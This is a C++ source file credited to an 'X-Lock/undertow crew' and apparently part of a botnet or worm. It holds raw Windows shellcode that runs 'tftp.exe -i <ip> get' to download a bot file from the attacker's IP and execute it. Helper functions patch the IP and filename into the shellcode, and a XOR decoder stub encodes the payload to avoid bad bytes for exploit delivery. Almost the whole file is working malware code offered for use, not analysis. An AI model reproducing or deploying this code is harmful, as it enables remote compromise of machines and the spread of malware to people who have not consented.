//
// shellcode.cpp  -  shellcode generation/encoding file
//
// Copyright (c) 2004 by X-Lock/undertow crew
// All Rights Reserved
//
// NOTE: thread safe, works with shellcodes up to 64KB
//
// NOTE²: to be sure that it works without problems allocate
//        257 more bytes than needed for EncodeRNS0() and
//        GetRNS0TerminatedShellcode().
//
//

#include "../header/includes.h"
#include "../header/functions.h"
#include "../header/externs.h"

// for shellcode up to 65535 bytes
char xor65535decoder[] =
	"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\x66\xB9\xFF\xFF"
	"\x80\x73\x0E\xFF\x43\xE2\xF9";

#define DECODER65535_OFFSET_SIZE      14  // offset for size of the encoder (word)
#define DECODER65535_OFFSET_XORKEY    19  // offset for the xor key

// for shellcode up to 255 bytes
char xor255decoder[] =
	"\xEB\x02\xEB\x05\xE8\xF9\xFF\xFF\xFF\x5B\x31\xC9\xB1\xFF\x80\x73"
	"\x0C\xFF\x43\xE2\xF9";

#define DECODER255_OFFSET_SIZE      13  // offset for size of the encoder (byte)
#define DECODER255_OFFSET_XORKEY    17  // offset for the xor key

char tftp_Shellcode[] =
	"\x33\xC0\x64\x03\x40\x30\x78\x0C\x8B\x40\x0C\x8B\x70\x1C\xAD\x8B"
	"\x40\x08\xEB\x09\x8B\x40\x34\x8D\x40\x7C\x8B\x40\x3C\x8B\xD0\x03"
	"\x40\x3C\x8B\xCA\x03\x48\x78\x8B\x41\x20\x8B\xDA\x03\x59\x1C\x33"
	"\xFF\x33\xF6\x57\x57\x8B\xCA\x03\x0C\x10\x81\x79\x0A\x65\x73\x73"
	"\x41\x75\x02\x8B\x33\x81\x79\x03\x74\x54\x68\x72\x75\x02\x8B\x3B"
	"\x83\xC0\x04\x83\xC3\x04\x85\xF6\x74\xDB\x85\xFF\x74\xD7\x03\xF2"
	"\x03\xFA\x57\xE8\x12\x00\x00\x00\x74\x66\x74\x70\x2E\x65\x78\x65"
	"\x20\x2D\x69\x20\x20\x67\x65\x74\x20\x00\x6A\x00\xE8\x17\x00\x00"
	"\x00\x75\x01\xC3\xE8\x01\x00\x00\x00\x00\x6A\x00\xE8\x07\x00\x00"
	"\x00\x0F\x84\xED\xFF\xFF\xFF\xC3\x58\x5B\x5D\x50\x83\xEC\x54\x33"
	"\xC0\x8B\xFC\x8D\x48\x40\x8B\xD7\xF3\xAA\xB0\x44\xAB\x57\x52\x51"
	"\x51\x6A\x28\x6A\x01\x51\x51\x55\x53\xFF\xD6\x83\xC4\x54\x85\xC0"
	"\xC3"; // 193 bytes

char xorhelp; // helps encoding shellcode faster

DWORD GetShellcodeSize(char *ownip, char *botfilename)
{
	DWORD IPLength = strlen(ownip);
	DWORD BotFileNameLength = strlen(botfilename);

	return 0x74 + IPLength + 0x05 + BotFileNameLength + 0x10 + BotFileNameLength + 0x38;
}

DWORD GetShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename)
{
	DWORD ShellcodeSize = GetShellcodeSize(ownip, botfilename);
	if (ShellcodeSize > buffersize) return 0;

	DWORD IPLength = strlen(ownip);
	DWORD BotFileNameLength = strlen(botfilename);

	DWORD *CallOver1 = PDWORD(tftp_Shellcode+0x64);
	*CallOver1 = (IPLength + BotFileNameLength + 0x12);

	DWORD *CallOver2 = PDWORD(tftp_Shellcode+0x85);
	*CallOver2 = (BotFileNameLength + 1);

	DWORD *CallCreateProcess1 = PDWORD(tftp_Shellcode+0x7D);
	*CallCreateProcess1 = (BotFileNameLength + 1 + 0x16);

	DWORD *JzExecuteBotfileLoop = PDWORD(tftp_Shellcode+0x93);
	*JzExecuteBotfileLoop = (0xFFFFFFED - BotFileNameLength);

	DWORD i = 0;

	memcpy(buffer+i, tftp_Shellcode,            0x74); i += 0x74;
	memcpy(buffer+i, ownip,                 IPLength); i += IPLength;
	memcpy(buffer+i, tftp_Shellcode+0x74,       0x05); i += 0x05;
	memcpy(buffer+i, botfilename,  BotFileNameLength); i += BotFileNameLength;
	memcpy(buffer+i, tftp_Shellcode+0x79,       0x10); i += 0x10;
	memcpy(buffer+i, botfilename,  BotFileNameLength); i += BotFileNameLength;
	memcpy(buffer+i, tftp_Shellcode+0x89,       0x38); i += 0x38;

	return ShellcodeSize;
}

DWORD GetRNS0TerminatedShellcodeSize(char *ownip, char *botfilename)
{
	return GetRNS0EncodedSize(GetShellcodeSize(ownip, botfilename));
}

DWORD GetRNS0TerminatedShellcode(char *buffer, DWORD buffersize, char *ownip, char *botfilename)
{
	DWORD RNS0TerminatedShellcodeSize = GetRNS0TerminatedShellcodeSize(ownip, botfilename);
	if (RNS0TerminatedShellcodeSize > buffersize) return 0;
	if (RNS0TerminatedShellcodeSize > 65535) return 0;

	char *Shellcode = (char *)malloc(GetShellcodeSize(ownip, botfilename)+257);
	DWORD ShellcodeSize = GetShellcode(Shellcode, GetShellcodeSize(ownip, botfilename), ownip, botfilename);
	RNS0TerminatedShellcodeSize = EncodeRNS0(buffer, buffersize, Shellcode, ShellcodeSize);

	free(Shellcode);

	return RNS0TerminatedShellcodeSize;
}

DWORD GetRNS0EncodedSize(DWORD shellcodesize)
{
	if (!(shellcodesize & 0xFF))
		shellcodesize++;
	DWORD DecoderSize = shellcodesize <= 0xFF ? sizeof(xor255decoder)-1 : sizeof(xor65535decoder)-1;

	return DecoderSize+shellcodesize;
}

// no 0x0A (\r) - 0x0D (\n) - 0x5C (\\) - 0x00 (\0) after encoding
DWORD EncodeRNS0(char *buffer, DWORD buffersize, char *shellcode, DWORD shellcodesize)
{
	char b = (char)(shellcodesize & 0xFF);
	if (b == 0x0A || b == 0x0D || b == 0x5C || b == 0x00)
		shellcodesize += 0x0001;

	if (shellcodesize > 0xFF) {
		b = (char)((shellcodesize >> 8) & 0xFF);
		if (b == 0x0A || b == 0x0D || b == 0x5c || b == 0x00)
			shellcodesize += 0x0100;
	}

	DWORD RNS0EncodedSize = GetRNS0EncodedSize(shellcodesize);
	if (RNS0EncodedSize > buffersize) return 0;
	if (RNS0EncodedSize > 65535) return 0;

	DWORD i, j;
	char x = xorhelp;

	// find x occurance in Shellcode buffer
	for (i = 0; i < shellcodesize; i++) {
		char result = shellcode[i]^x;
		if (result == 0x00 || result == 0x0A || result == 0x0D || result == 0x5C) {
			x++;
			i = 0;
		}
	}
	xorhelp = x;

	// set size & xor key and copy decoder
	if (shellcodesize <= 0xFF) {
		xor255decoder[DECODER255_OFFSET_SIZE]   = (char)(shellcodesize);
		xor255decoder[DECODER255_OFFSET_XORKEY] = x;
		memcpy(buffer, xor255decoder, sizeof(xor255decoder)-1);
		i = sizeof(xor255decoder)-1;
	} else {
		char *d65535os = &xor65535decoder[DECODER65535_OFFSET_SIZE];
		*(short *)d65535os = (short)(shellcodesize);
		xor65535decoder[DECODER65535_OFFSET_XORKEY] = x;
		memcpy(buffer, xor65535decoder, sizeof(xor65535decoder)-1);
		i = sizeof(xor65535decoder)-1;
	}

	// copy encoded shellcode to buffer
	for (j = 0; j < shellcodesize; j++)
		buffer[i+j] = (shellcode[j] ^ x);

	// -> bye :D
	return RNS0EncodedSize;
}
